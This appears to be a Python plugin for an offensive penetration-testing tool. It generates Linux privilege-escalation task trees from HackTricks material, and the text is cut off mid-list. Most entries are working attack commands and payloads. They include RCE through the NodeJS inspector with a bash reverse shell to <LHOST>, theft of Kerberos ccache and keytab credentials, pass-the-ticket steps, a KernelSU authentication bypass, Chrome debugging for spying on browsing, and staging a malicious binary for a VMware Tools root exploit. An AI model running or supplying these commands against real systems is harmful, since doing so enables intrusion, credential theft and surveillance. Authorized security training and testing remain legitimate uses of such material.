"""
Linux Privilege Escalation plugin

Generates comprehensive privilege escalation tasks including:
- Electron/CEF/Chromium debugger abuse (NodeJS inspector, Chrome DevTools)
- Linux Active Directory integration attacks (CCACHE tickets, keytabs, FreeIPA)
- Android rooting framework abuse (KernelSU/Magisk syscall hooks)
- VMware Tools service discovery abuse (CVE-2025-41244)
- Process manipulation and debugging
- Credential theft from Linux AD integration

Extracted from HackTricks Linux Privilege Escalation guides
Generated by: CrackPot v1.0
"""

from typing import Dict, Any, List, Optional
from .base import ServicePlugin
from .registry import ServiceRegistry


@ServiceRegistry.register
class LinuxPrivEscAdvancedPlugin(ServicePlugin):
    """Linux privilege escalation plugin for advanced/specialized techniques"""

    @property
    def name(self) -> str:
        return "linux-privesc-advanced"

    @property
    def default_ports(self) -> List[int]:
        return []  # Not port-based, triggered by OS detection

    @property
    def service_names(self) -> List[str]:
        return ['linux', 'unix', 'shell']

    def detect(self, port_info: Dict[str, Any], profile: 'TargetProfile') -> bool:
        """Detect Linux systems - manual trigger only"""
        # This plugin requires manual trigger or OS detection
        # Not auto-triggered by port scans
        return False

    def detect_from_finding(self, finding: Dict[str, Any], profile: Optional['TargetProfile'] = None) -> float:
        """Activate on advanced Linux scenarios (root shell, kernel exploits)

        Triggers on:
        - Root shell obtained
        - Kernel vulnerabilities
        - High privilege shell on Linux
        - SUID binaries found
        - Capabilities found

        Args:
            finding: Finding dictionary
            profile: Optional target profile

        Returns:
            Confidence score (0-100)
        """
        from ..core.constants import FindingTypes
        import logging
        logger = logging.getLogger(__name__)

        finding_type = finding.get('type', '').lower()
        description = finding.get('description', '').lower()

        # Perfect match - Root shell obtained
        if finding_type == FindingTypes.ROOT_SHELL:
            logger.info(f"Linux advanced privesc activating: Root shell")
            return 100

        # High confidence - Kernel vulnerability
        if finding_type == FindingTypes.KERNEL_VULNERABLE:
            logger.info(f"Linux advanced privesc activating: Kernel vulnerable")
            return 95

        # High confidence - High privilege shell on Linux
        if finding_type == FindingTypes.HIGH_PRIVILEGE_SHELL:
            if 'linux' in description or any(ind in description for ind in ['bash', 'sh', '/bin']):
                logger.info(f"Linux advanced privesc activating: High privilege Linux shell")
                return 90

        # Medium confidence - SUID binaries found
        if finding_type == FindingTypes.SUID_BINARY_FOUND:
            return 70

        # Medium confidence - Capabilities found
        if finding_type == FindingTypes.CAPABILITY_FOUND:
            return 70

        # Medium confidence - SGID binaries
        if finding_type == FindingTypes.SGID_BINARY_FOUND:
            return 65

        # Medium confidence - Container detected (for escape techniques)
        if finding_type == FindingTypes.CONTAINER_DETECTED:
            return 60
        if finding_type == FindingTypes.DOCKER_DETECTED:
            return 60

        # Check for advanced indicators in description
        advanced_indicators = [
            'root obtained', 'root access', 'kernel exploit',
            'suid binary', 'capability', 'container escape'
        ]
        if any(ind in description for ind in advanced_indicators):
            return 55

        return 0

    def get_task_tree(self, target: str, port: int, service_info: Dict[str, Any]) -> Dict[str, Any]:
        """Generate Linux privilege escalation task tree"""

        tasks = {
            'id': f'linux-privesc-{target}',
            'name': f'Linux Privilege Escalation: {target}',
            'type': 'parent',
            'children': []
        }

        # ===== ELECTRON/CEF/CHROMIUM DEBUGGER ABUSE =====
        tasks['children'].append(self._get_debugger_abuse_tasks(target))

        # ===== LINUX ACTIVE DIRECTORY INTEGRATION =====
        tasks['children'].append(self._get_linux_ad_tasks(target))

        # ===== ANDROID ROOTING FRAMEWORK ABUSE =====
        tasks['children'].append(self._get_android_rooting_tasks(target))

        # ===== VMWARE TOOLS SERVICE DISCOVERY ABUSE =====
        tasks['children'].append(self._get_vmware_tools_tasks(target))

        return tasks

    def _get_debugger_abuse_tasks(self, target: str) -> Dict[str, Any]:
        """Electron/CEF/Chromium debugger abuse techniques"""
        return {
            'id': f'debugger-abuse-{target}',
            'name': 'Electron/CEF/Chromium Debugger Abuse',
            'type': 'parent',
            'children': [
                # Enumerate Node.js inspector processes
                {
                    'id': f'find-node-inspector-{target}',
                    'name': 'Find NodeJS Inspector Processes',
                    'type': 'command',
                    'metadata': {
                        'command': 'ps aux | grep -E "node.*--inspect|electron.*--remote-debugging-port"',
                        'description': 'Identify NodeJS processes running with --inspect or Electron apps with debugging enabled',
                        'tags': ['OSCP:MEDIUM', 'QUICK_WIN', 'MANUAL', 'ENUM'],
                        'flag_explanations': {
                            'ps aux': 'List all processes with full details',
                            'grep -E': 'Extended regex pattern matching',
                            '--inspect': 'NodeJS debugger flag (opens inspector on port 9229 by default)',
                            '--remote-debugging-port': 'Chromium/Electron debugging port flag'
                        },
                        'success_indicators': [
                            'Process found with --inspect flag',
                            'Debugger port visible (e.g., 127.0.0.1:9229)',
                            'UUID/session ID visible in output'
                        ],
                        'failure_indicators': [
                            'No debugging processes found',
                            'Processes running without debug flags'
                        ],
                        'next_steps': [
                            'Note the PID and port number',
                            'Check if port is listening with: ss -tlnp | grep <port>',
                            'Attempt to connect with: node inspect 127.0.0.1:<port>',
                            'Use cefdebug to enumerate: ./cefdebug.exe'
                        ],
                        'alternatives': [
                            'netstat -tlnp | grep 9229  # Find inspector ports',
                            'lsof -i :9229  # Check what is using inspector port',
                            'ss -tlnp | grep -E "9229|9222"  # Both NodeJS and Chrome ports'
                        ],
                        'notes': 'NodeJS inspector listens on 127.0.0.1:9229 by default. Full access to execution environment = potential RCE/privesc',
                        'estimated_time': '1-2 minutes'
                    }
                },
                # Trigger inspector on running process
                {
                    'id': f'trigger-inspector-sigusr1-{target}',
                    'name': 'Trigger Inspector with SIGUSR1',
                    'type': 'command',
                    'metadata': {
                        'command': 'kill -s SIGUSR1 <nodejs-pid>',
                        'description': 'Send SIGUSR1 signal to running NodeJS process to activate inspector on default port',
                        'tags': ['OSCP:HIGH', 'QUICK_WIN', 'MANUAL', 'EXPLOIT'],
                        'flag_explanations': {
                            'kill': 'Send signal to process (not just kill)',
                            '-s SIGUSR1': 'User-defined signal 1 (triggers NodeJS inspector)',
                            '<nodejs-pid>': 'Process ID of target NodeJS process'
                        },
                        'success_indicators': [
                            'Debugger URL appears: ws://127.0.0.1:9229/<UUID>',
                            'Port 9229 now listening',
                            'No permission denied error'
                        ],
                        'failure_indicators': [
                            'Permission denied (need same user or root)',
                            'Process not NodeJS (no inspector support)',
                            'Process crashes/restarts'
                        ],
                        'next_steps': [
                            'Copy the WebSocket URL from output',
                            'Connect with: node inspect <ip>:<port>',
                            'Execute RCE from debug console',
                            'Use cefdebug for automation'
                        ],
                        'alternatives': [
                            'Manual: Check /proc/<pid>/cmdline for node binary',
                            'If root: Use gdb to attach and manipulate process',
                            'Restart process with --inspect if you control start script'
                        ],
                        'notes': 'Requires sufficient privileges (same user or root). Useful in containers where restart kills container.',
                        'estimated_time': '30 seconds'
                    }
                },
                # RCE via NodeJS inspector
                {
                    'id': f'nodejs-inspector-rce-{target}',
                    'name': 'NodeJS Inspector RCE',
                    'type': 'command',
                    'metadata': {
                        'command': 'node inspect 127.0.0.1:9229',
                        'description': 'Connect to NodeJS inspector and execute arbitrary code as process owner',
                        'tags': ['OSCP:HIGH', 'EXPLOIT', 'MANUAL'],
                        'flag_explanations': {
                            'node inspect': 'NodeJS CLI debugger client',
                            '127.0.0.1:9229': 'Inspector host and port'
                        },
                        'success_indicators': [
                            'Debug console appears with debug> prompt',
                            'Can execute JavaScript expressions',
                            'exec() or eval() commands work'
                        ],
                        'failure_indicators': [
                            'Connection refused (inspector not running)',
                            'Host header check failed (SSRF protection)',
                            'Timeout connecting'
                        ],
                        'next_steps': [
                            'From debug console: exec("process.mainModule.require(\'child_process\').exec(\'<command>\')")',
                            'Reverse shell: exec("process.mainModule.require(\'child_process\').exec(\'bash -c \\\'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1\\\'\')")',
                            'Read files: exec("require(\'fs\').readFileSync(\'/etc/passwd\', \'utf8\')")',
                            'Write SSH key for persistence'
                        ],
                        'alternatives': [
                            'Chrome DevTools: chrome://inspect (configure target host:port)',
                            'cefdebug: ./cefdebug --url ws://127.0.0.1:9229/<UUID> --code "process.mainModule.require(\'child_process\').exec(\'calc\')"',
                            'WebSocket client with Chrome DevTools Protocol'
                        ],
                        'notes': 'RCE payloads: process.mainModule.require("child_process").exec("calc") or window.appshell.app.openURLInDefaultBrowser("c:/calc.exe")',
                        'estimated_time': '2-5 minutes'
                    }
                },
                # Enumerate with cefdebug
                {
                    'id': f'cefdebug-enum-{target}',
                    'name': 'Enumerate Debuggers with cefdebug',
                    'type': 'command',
                    'metadata': {
                        'command': './cefdebug',
                        'description': 'Automatically find and enumerate all local NodeJS inspectors and CEF debuggers',
                        'tags': ['OSCP:HIGH', 'QUICK_WIN', 'AUTOMATED', 'ENUM'],
                        'flag_explanations': {
                            './cefdebug': 'Tool to find and exploit CEF/NodeJS debuggers (https://github.com/taviso/cefdebug)'
                        },
                        'success_indicators': [
                            'List of WebSocket URLs discovered',
                            'Process names and PIDs shown',
                            'Vulnerable debuggers identified'
                        ],
                        'failure_indicators': [
                            'No debuggers found',
                            'Permission denied (need to compile first)',
                            'Tool not installed'
                        ],
                        'next_steps': [
                            'Test each URL: ./cefdebug --url <ws://...> --code "process.version"',
                            'Exploit: ./cefdebug --url <ws://...> --code "process.mainModule.require(\'child_process\').exec(\'<payload>\')"',
                            'For Chrome DevTools Protocol: Check API at https://chromedevtools.github.io/devtools-protocol/'
                        ],
                        'alternatives': [
                            'Manual: netstat -tlnp | grep -E "9229|9222"',
                            'Chrome: chrome://inspect then Configure to add target',
                            'Manual WebSocket connection with wscat or custom script'
                        ],
                        'notes': 'Install: git clone https://github.com/taviso/cefdebug && cd cefdebug && make',
                        'estimated_time': '30 seconds'
                    }
                },
                # Chrome DevTools Protocol exploitation
                {
                    'id': f'chrome-devtools-exploit-{target}',
                    'name': 'Chrome DevTools Protocol Exploitation',
                    'type': 'parent',
                    'children': [
                        {
                            'id': f'cdp-file-overwrite-{target}',
                            'name': 'Overwrite Files via Download Behavior',
                            'type': 'manual',
                            'metadata': {
                                'description': 'Change download folder and download malicious file to overwrite application source code',
                                'tags': ['OSCP:MEDIUM', 'EXPLOIT', 'MANUAL'],
                                'alternatives': [
                                    'WebSocket to Chrome DevTools: ws.send(JSON.stringify({id:42069, method:"Browser.setDownloadBehavior", params:{behavior:"allow", downloadPath:"/code/"}}))',
                                    'Then trigger download of malicious code to overwrite frequently loaded modules',
                                    'Application will load your malicious code on next execution'
                                ],
                                'notes': 'Requires WebSocket connection to Chrome DevTools Protocol endpoint (port 9222)',
                                'estimated_time': '5-10 minutes'
                            }
                        },
                        {
                            'id': f'cdp-parameter-injection-{target}',
                            'name': 'Parameter Injection via Deep Links (CVE-2021-38112)',
                            'type': 'manual',
                            'metadata': {
                                'description': 'Inject command-line flags via custom URI schemes to execute arbitrary commands',
                                'tags': ['OSCP:MEDIUM', 'EXPLOIT', 'MANUAL'],
                                'alternatives': [
                                    'Example: workspaces://anything%20--gpu-launcher=%22calc.exe%22@CODE',
                                    'Inject --gpu-launcher flag to execute arbitrary command',
                                    'Works when CEF app registers custom URI handler'
                                ],
                                'notes': 'CVE-2021-38112 in AWS Workspaces. URI parameters are URL decoded and used to construct command line.',
                                'estimated_time': '10-15 minutes'
                            }
                        }
                    ]
                },
                # Post-exploitation persistence
                {
                    'id': f'chrome-debug-persistence-{target}',
                    'name': 'Chrome Debugging Persistence',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Restart victim Chrome with debugging enabled to spy on all browsing activity',
                        'tags': ['OSCP:LOW', 'POST_EXPLOIT', 'MANUAL'],
                        'alternatives': [
                            'Terminate Chrome: pkill chrome',
                            'Start with debugging: google-chrome --remote-debugging-port=9222 --restore-last-session &',
                            'Port-forward 9222 to attacker machine',
                            'Access chrome://inspect from attacker to see all victim tabs/activity'
                        ],
                        'notes': 'Post-compromise technique to maintain surveillance. Can steal credentials, session tokens, etc.',
                        'estimated_time': '5 minutes'
                    }
                }
            ]
        }

    def _get_linux_ad_tasks(self, target: str) -> Dict[str, Any]:
        """Linux Active Directory integration attacks"""
        return {
            'id': f'linux-ad-{target}',
            'name': 'Linux Active Directory Integration Attacks',
            'type': 'parent',
            'children': [
                # Find Kerberos CCACHE tickets
                {
                    'id': f'find-ccache-tmp-{target}',
                    'name': 'Find CCACHE Tickets in /tmp',
                    'type': 'command',
                    'metadata': {
                        'command': 'ls -la /tmp/ | grep krb5cc',
                        'description': 'Locate Kerberos credential cache files stored in /tmp (format: krb5cc_%{uid})',
                        'tags': ['OSCP:HIGH', 'QUICK_WIN', 'MANUAL', 'ENUM'],
                        'flag_explanations': {
                            'ls -la': 'List all files including hidden, with details',
                            '/tmp/': 'Temporary directory where Kerberos stores tickets',
                            'grep krb5cc': 'Filter for Kerberos cache files (naming convention)'
                        },
                        'success_indicators': [
                            'Files matching krb5cc_<uid> found',
                            'File permissions show 600 (readable by owner)',
                            'Multiple tickets for different users'
                        ],
                        'failure_indicators': [
                            'No krb5cc files found',
                            'Permission denied on /tmp',
                            'Files exist but empty/expired'
                        ],
                        'next_steps': [
                            'Check current ticket: env | grep KRB5CCNAME',
                            'Reuse ticket: export KRB5CCNAME=/tmp/krb5cc_<uid>',
                            'Test ticket: klist',
                            'Use ticket for authentication: smbclient, psexec, etc.'
                        ],
                        'alternatives': [
                            'find /tmp -name "krb5cc_*" -ls',
                            'Manual: cat /tmp/krb5cc_1000 | base64  # Export for offline analysis',
                            'Check environment: echo $KRB5CCNAME'
                        ],
                        'notes': 'CCACHE files are portable - copy to attacker machine and use with impacket tools',
                        'estimated_time': '1 minute'
                    }
                },
                # Extract tickets from keyring
                {
                    'id': f'extract-keyring-tickets-{target}',
                    'name': 'Extract CCACHE Tickets from Keyring',
                    'type': 'command',
                    'metadata': {
                        'command': 'git clone https://github.com/TarlogicSecurity/tickey && cd tickey/tickey && make CONF=Release && /tmp/tickey -i',
                        'description': 'Extract Kerberos tickets from process memory when stored in keyring (requires ptrace enabled)',
                        'tags': ['OSCP:MEDIUM', 'AUTOMATED', 'ENUM'],
                        'flag_explanations': {
                            'tickey -i': 'Inject into sessions and dump tickets',
                            'CONF=Release': 'Compile in release mode',
                            '/proc/sys/kernel/yama/ptrace_scope': 'Must be 0 for ptrace to work'
                        },
                        'success_indicators': [
                            'Tickets dumped to /tmp/__krb_<UID>.ccache',
                            'Injection successful messages',
                            'Valid TGT/TGS tickets extracted'
                        ],
                        'failure_indicators': [
                            'ptrace: Operation not permitted (ptrace_scope = 1)',
                            'No tickets found in memory',
                            'Compilation errors'
                        ],
                        'next_steps': [
                            'List extracted tickets: ls /tmp/__krb_*.ccache',
                            'Use ticket: export KRB5CCNAME=/tmp/__krb_<UID>.ccache',
                            'Verify: klist',
                            'Attack with impacket or native tools'
                        ],
                        'alternatives': [
                            'Manual: cat /proc/sys/kernel/yama/ptrace_scope  # Check if ptrace allowed',
                            'If root: echo 0 > /proc/sys/kernel/yama/ptrace_scope  # Enable ptrace',
                            'gdb attach to process and dump memory regions'
                        ],
                        'notes': 'Requires ptrace_scope=0. In containers, ptrace often disabled. Tool: https://github.com/TarlogicSecurity/tickey',
                        'estimated_time': '3-5 minutes'
                    }
                },
                # Extract from SSSD KCM
                {
                    'id': f'extract-sssd-kcm-{target}',
                    'name': 'Extract Tickets from SSSD KCM',
                    'type': 'command',
                    'metadata': {
                        'command': 'git clone https://github.com/fireeye/SSSDKCMExtractor && python3 SSSDKCMExtractor.py --database /var/lib/sss/secrets/secrets.ldb --key /var/lib/sss/secrets/.secrets.mkey',
                        'description': 'Decrypt Kerberos tickets from SSSD KCM database (requires root to read key)',
                        'tags': ['OSCP:HIGH', 'AUTOMATED', 'PRIVESC'],
                        'flag_explanations': {
                            '--database': 'Path to SSSD secrets database',
                            '--key': 'Path to master encryption key (hidden file, root-only)',
                            'secrets.ldb': 'LMDB database containing encrypted Kerberos blobs',
                            '.secrets.mkey': 'Master key for decryption'
                        },
                        'success_indicators': [
                            'Tickets successfully decrypted',
                            'CCache blobs extracted',
                            'Valid principal names shown'
                        ],
                        'failure_indicators': [
                            'Permission denied on .secrets.mkey (need root)',
                            'Database file not found (SSSD not in use)',
                            'Decryption errors'
                        ],
                        'next_steps': [
                            'Convert blob to CCache file format',
                            'Import to Mimikatz/Rubeus on Windows',
                            'Use with impacket tools on Linux',
                            'Pass-the-Ticket attack'
                        ],
                        'alternatives': [
                            'Manual: Check if SSSD in use: systemctl status sssd',
                            'Find database: find /var/lib/sss -name "*.ldb"',
                            'Check key permissions: ls -la /var/lib/sss/secrets/.secrets.mkey'
                        ],
                        'notes': 'SSSD = System Security Services Daemon. Database at /var/lib/sss/secrets/. Requires root access.',
                        'estimated_time': '2-3 minutes'
                    }
                },
                # Extract from keytab
                {
                    'id': f'extract-keytab-{target}',
                    'name': 'Extract Credentials from Keytab',
                    'type': 'command',
                    'metadata': {
                        'command': 'klist -k /etc/krb5.keytab',
                        'description': 'List service account keys from keytab file (equivalent to service passwords)',
                        'tags': ['OSCP:HIGH', 'QUICK_WIN', 'MANUAL', 'ENUM'],
                        'flag_explanations': {
                            'klist': 'Kerberos ticket list utility',
                            '-k': 'List keytab file entries instead of credential cache',
                            '/etc/krb5.keytab': 'Default location for service account keys'
                        },
                        'success_indicators': [
                            'Service principals listed (e.g., HTTP/server@REALM)',
                            'Key version numbers (KVNO) shown',
                            'Encryption types visible (especially type 23 = RC4/NTLM)'
                        ],
                        'failure_indicators': [
                            'File does not exist',
                            'Permission denied (need root or service user)',
                            'Empty keytab'
                        ],
                        'next_steps': [
                            'Extract NT hash: python3 keytabextract.py /etc/krb5.keytab',
                            'Use hash: crackmapexec <target> -u "ServiceAccount$" -H <hash> -d DOMAIN',
                            'Request TGT with key: kinit -kt /etc/krb5.keytab <principal>',
                            'Pass-the-Key attack'
                        ],
                        'alternatives': [
                            'KeyTabExtract (Linux): git clone https://github.com/sosdave/KeyTabExtract && python3 keytabextract.py krb5.keytab',
                            'klist.exe (Windows): klist.exe -t -K -e -k FILE:C:/krb5.keytab',
                            'bifrost (macOS): ./bifrost -action dump -source keytab -path /etc/krb5.keytab',
                            'Manual: strings /etc/krb5.keytab | grep -E "^[A-Z]"'
                        ],
                        'notes': 'Keytab files store long-term keys for services (like passwords). Type 23 = RC4 HMAC = NTLM hash reusable.',
                        'estimated_time': '1-2 minutes'
                    }
                },
                # FreeIPA enumeration
                {
                    'id': f'freeipa-enum-{target}',
                    'name': 'FreeIPA Enumeration',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Enumerate FreeIPA (open-source AD alternative for Unix) using LDAP/Kerberos',
                        'tags': ['OSCP:MEDIUM', 'ENUM', 'MANUAL'],
                        'alternatives': [
                            'Check if FreeIPA: systemctl status ipa',
                            'LDAP enumeration: ldapsearch -x -H ldap://<target> -b "dc=domain,dc=com"',
                            'Kerberos: kinit admin  # Test authentication',
                            'User enumeration: ipa user-find --all',
                            'Group enumeration: ipa group-find'
                        ],
                        'notes': 'FreeIPA combines LDAP + Kerberos + SSSD. Similar attack surface to AD. Check pentesting-ldap methodology.',
                        'estimated_time': '5-10 minutes'
                    }
                },
                # Pass-the-Ticket from Linux
                {
                    'id': f'linux-ptt-{target}',
                    'name': 'Pass-the-Ticket from Linux',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Convert Linux CCACHE tickets to Windows Kirbi format and perform PTT attack',
                        'tags': ['OSCP:HIGH', 'EXPLOIT', 'MANUAL'],
                        'alternatives': [
                            'Export ticket: export KRB5CCNAME=/tmp/krb5cc_1000',
                            'Convert CCACHE to Kirbi: impacket-ticketConverter krb5cc_1000 ticket.kirbi',
                            'Transfer to Windows attacker machine',
                            'Import to Windows: Rubeus.exe ptt /ticket:ticket.kirbi',
                            'Or use directly with impacket: psexec.py -k -no-pass <target>'
                        ],
                        'notes': 'Kerberos tickets from Linux can be used on Windows and vice versa. CCACHE = Linux format, Kirbi = Windows format.',
                        'estimated_time': '5 minutes'
                    }
                },
                # AD enumeration from Linux
                {
                    'id': f'linux-ad-enum-{target}',
                    'name': 'AD Enumeration from Linux',
                    'type': 'command',
                    'metadata': {
                        'command': 'git clone https://github.com/lefayjey/linWinPwn && cd linWinPwn && ./linWinPwn.sh -t <DC-IP>',
                        'description': 'Automated AD enumeration from Linux using linWinPwn',
                        'tags': ['OSCP:MEDIUM', 'AUTOMATED', 'ENUM'],
                        'flag_explanations': {
                            '-t': 'Target domain controller IP',
                            'linWinPwn': 'Comprehensive AD enumeration suite for Linux/Bash'
                        },
                        'success_indicators': [
                            'User and group enumeration complete',
                            'BloodHound data collected',
                            'Vulnerable configurations identified'
                        ],
                        'failure_indicators': [
                            'Authentication failed',
                            'Network unreachable',
                            'Dependencies missing'
                        ],
                        'next_steps': [
                            'Review enumeration output',
                            'Import BloodHound data',
                            'Target identified misconfigurations',
                            'Attempt Kerberoasting, ASREPRoasting'
                        ],
                        'alternatives': [
                            'Manual LDAP: ldapsearch -x -H ldap://<DC> -b "dc=domain,dc=com"',
                            'enum4linux-ng: enum4linux-ng -A <DC>',
                            'CrackMapExec: crackmapexec ldap <DC> -u user -p pass --users --groups'
                        ],
                        'notes': 'Tool: https://github.com/lefayjey/linWinPwn. Requires network access to DC.',
                        'estimated_time': '5-10 minutes'
                    }
                }
            ]
        }

    def _get_android_rooting_tasks(self, target: str) -> Dict[str, Any]:
        """Android rooting framework syscall hook abuse"""
        return {
            'id': f'android-rooting-{target}',
            'name': 'Android Rooting Framework Abuse',
            'type': 'parent',
            'children': [
                # Detect rooting framework
                {
                    'id': f'detect-rooting-framework-{target}',
                    'name': 'Detect Rooting Framework',
                    'type': 'command',
                    'metadata': {
                        'command': 'ps aux | grep -E "magisk|kernelsu|apatch|skroot"',
                        'description': 'Identify if device is rooted with KernelSU, Magisk, APatch, or SKRoot',
                        'tags': ['OSCP:LOW', 'QUICK_WIN', 'MANUAL', 'ENUM'],
                        'flag_explanations': {
                            'ps aux': 'List all processes',
                            'grep -E': 'Extended regex to match rooting framework names',
                            'kernelsu|magisk': 'Common Android rooting frameworks'
                        },
                        'success_indicators': [
                            'Magisk or KernelSU process found',
                            'Manager app visible in process list',
                            'Root services running'
                        ],
                        'failure_indicators': [
                            'No rooting framework detected',
                            'Device not rooted',
                            'SELinux enforcing without root'
                        ],
                        'next_steps': [
                            'Identify framework version',
                            'Check for known vulnerabilities',
                            'Attempt manager authentication bypass',
                            'Test syscall hook abuse'
                        ],
                        'alternatives': [
                            'Check for su binary: which su',
                            'Check Magisk Manager: pm list packages | grep magisk',
                            'Check kernel version: uname -r | grep -i ksu'
                        ],
                        'notes': 'Only works on already-rooted devices. Not a rooting exploit, but privesc on rooted system.',
                        'estimated_time': '1 minute'
                    }
                },
                # KernelSU manager auth bypass (CVE reference)
                {
                    'id': f'kernelsu-auth-bypass-{target}',
                    'name': 'KernelSU Manager Authentication Bypass (v0.5.7)',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Bypass KernelSU manager authentication by manipulating file descriptor order to impersonate legitimate manager',
                        'tags': ['OSCP:LOW', 'EXPLOIT', 'MANUAL'],
                        'alternatives': [
                            'Precondition: Device rooted with KernelSU v0.5.7 (vulnerable version)',
                            'Step 1: Build path to your app data dir to satisfy ownership check',
                            'Step 2: Bundle legitimate KernelSU Manager APK with your malicious app',
                            'Step 3: Close low FD (e.g., stdin fd 0) and open legit manager APK first',
                            'Step 4: Your base.apk on higher FD - kernel checks first matching /data/app/*/base.apk',
                            'Step 5: Call prctl(0xDEADBEEF, CMD_BECOME_MANAGER, <your_data_dir>)',
                            'Step 6: Issue privileged commands: CMD_GRANT_ROOT, CMD_ALLOW_SU, CMD_SET_SEPOLICY'
                        ],
                        'notes': 'Vulnerability: Trust-by-indirection. Kernel scans FDs for first /data/app/*/base.apk without verifying package identity. Source: Zimperium research.',
                        'estimated_time': '20-30 minutes'
                    }
                },
                # Syscall hook abuse pattern
                {
                    'id': f'rooting-syscall-hook-{target}',
                    'name': 'Rooting Framework Syscall Hook Abuse',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Exploit syscall-hooked manager channel (commonly prctl) to escalate privileges',
                        'tags': ['OSCP:LOW', 'EXPLOIT', 'MANUAL'],
                        'alternatives': [
                            'Architecture: Kernel hooks syscall (prctl) to receive commands from userspace',
                            'Protocol: magic_value (e.g., 0xDEADBEEF), command_id, arg_ptr/len',
                            'Manager authenticates first (CMD_BECOME_MANAGER)',
                            'Then privileged commands accepted: CMD_GRANT_ROOT, CMD_SET_SEPOLICY',
                            'Attack: Bypass manager auth to call privileged commands directly',
                            'Race condition: Win authentication race after reboot before real manager'
                        ],
                        'notes': 'Generic pattern across KernelSU, APatch, SKRoot. Each has different magic value and command IDs.',
                        'estimated_time': '30+ minutes research + exploit dev'
                    }
                },
                # FD manipulation technique
                {
                    'id': f'fd-manipulation-android-{target}',
                    'name': 'File Descriptor Manipulation Technique',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Control FD ordering to trick kernel signature validation (general technique)',
                        'tags': ['OSCP:LOW', 'MANUAL', 'TECHNIQUE'],
                        'alternatives': [
                            'Concept: Kernel validates "first matching FD" instead of caller identity',
                            'open() returns lowest available FD',
                            'close(0) frees stdin, next open() gets FD 0',
                            'Open legitimate signed APK first → FD 0',
                            'Your malicious APK at higher FD → bypasses signature check',
                            'Enumerate FDs: readdir(/proc/self/fd) and readlink() each'
                        ],
                        'notes': 'Portable technique - works whenever kernel trusts FD scan instead of process identity.',
                        'estimated_time': 'N/A - technique documentation'
                    }
                },
                # Detection and mitigation
                {
                    'id': f'rooting-detection-{target}',
                    'name': 'Rooting Framework Exploit Detection',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Detect syscall hook abuse and manager authentication bypass attempts',
                        'tags': ['OSCP:LOW', 'MANUAL', 'DEFENSIVE'],
                        'alternatives': [
                            'Detection: Monitor prctl() calls with suspicious magic constants (0xDEADBEEF)',
                            'Alert on boot receivers attempting rapid manager authentication',
                            'Kernel telemetry for unexpected privileged command sequences',
                            'Mitigation: Update to patched framework versions',
                            'Bind auth to caller package/UID, not arbitrary FDs',
                            'Use nonce-based challenge-response instead of path checks'
                        ],
                        'notes': 'Blue team guidance. Only affects already-rooted devices with vulnerable framework versions.',
                        'estimated_time': 'N/A - detection/defense guidance'
                    }
                }
            ]
        }

    def _get_vmware_tools_tasks(self, target: str) -> Dict[str, Any]:
        """VMware Tools service discovery abuse (CVE-2025-41244)"""
        return {
            'id': f'vmware-tools-{target}',
            'name': 'VMware Tools Service Discovery Abuse (CVE-2025-41244)',
            'type': 'parent',
            'children': [
                # Detect VMware Tools
                {
                    'id': f'detect-vmware-tools-{target}',
                    'name': 'Detect VMware Tools Installation',
                    'type': 'command',
                    'metadata': {
                        'command': 'ps aux | grep vmtoolsd',
                        'description': 'Check if VMware Tools is installed and running (required for exploitation)',
                        'tags': ['OSCP:LOW', 'QUICK_WIN', 'MANUAL', 'ENUM'],
                        'flag_explanations': {
                            'vmtoolsd': 'VMware Tools daemon process',
                            'ps aux': 'List all processes'
                        },
                        'success_indicators': [
                            '/usr/bin/vmtoolsd process running',
                            'Running as root or privileged user',
                            'Service discovery plugin loaded'
                        ],
                        'failure_indicators': [
                            'vmtoolsd not found',
                            'Not running in VMware VM',
                            'Service discovery disabled'
                        ],
                        'next_steps': [
                            'Check if service discovery enabled',
                            'Identify discovery script location',
                            'Test exploitation with dummy listener',
                            'Stage malicious binary'
                        ],
                        'alternatives': [
                            'systemctl status vmtoolsd',
                            'find /usr -name "get-versions.sh"  # Discovery script',
                            'Check VM: dmidecode -s system-product-name | grep VMware'
                        ],
                        'notes': 'CVE-2025-41244. VMware Tools service discovery executes arbitrary binaries matching regex patterns.',
                        'estimated_time': '30 seconds'
                    }
                },
                # Locate discovery script
                {
                    'id': f'locate-discovery-script-{target}',
                    'name': 'Locate Service Discovery Script',
                    'type': 'command',
                    'metadata': {
                        'command': 'find /usr -name "get-versions.sh" 2>/dev/null',
                        'description': 'Find VMware Tools service discovery script that executes version commands',
                        'tags': ['OSCP:MEDIUM', 'QUICK_WIN', 'MANUAL', 'ENUM'],
                        'flag_explanations': {
                            'find /usr': 'Search /usr directory tree',
                            '-name "get-versions.sh"': 'Look for discovery script',
                            '2>/dev/null': 'Suppress permission denied errors'
                        },
                        'success_indicators': [
                            'Script found (typical: /usr/lib/vmware-tools/plugins/serviceDiscovery/)',
                            'Script readable',
                            'Contains regex patterns for httpd, nginx, mysqld, etc.'
                        ],
                        'failure_indicators': [
                            'Script not found',
                            'Permission denied',
                            'Service discovery plugin not installed'
                        ],
                        'next_steps': [
                            'Read script to identify vulnerable patterns',
                            'Look for permissive regex with \\S',
                            'Identify which daemon names are matched',
                            'Plan binary staging location'
                        ],
                        'alternatives': [
                            'grep -r "get_version" /usr/lib/vmware-tools/',
                            'strings /usr/bin/vmtoolsd | grep -i discovery',
                            'Check open-vm-tools source on GitHub'
                        ],
                        'notes': 'Discovery script uses permissive regex like /\\S+/httpd that accepts /tmp/httpd',
                        'estimated_time': '1 minute'
                    }
                },
                # Exploit: Stage malicious binary
                {
                    'id': f'vmware-stage-binary-{target}',
                    'name': 'Stage Malicious Binary for Discovery',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Stage binary with name matching discovery regex in world-writable location',
                        'tags': ['OSCP:MEDIUM', 'EXPLOIT', 'MANUAL'],
                        'alternatives': [
                            'Step 1: Create helper binary that opens listening socket (default mode)',
                            'Step 2: When called with -v/--version flag: spawn privileged shell',
                            'Step 3: Copy to /tmp/httpd (or ./nginx, /tmp/mysqld, etc.)',
                            'Step 4: chmod +x /tmp/httpd',
                            'Step 5: Run as low-priv user: /tmp/httpd  # Opens listener',
                            'Step 6: Wait for discovery cycle (~5 minutes)',
                            'Step 7: vmtoolsd executes: /tmp/httpd -v  # As root!',
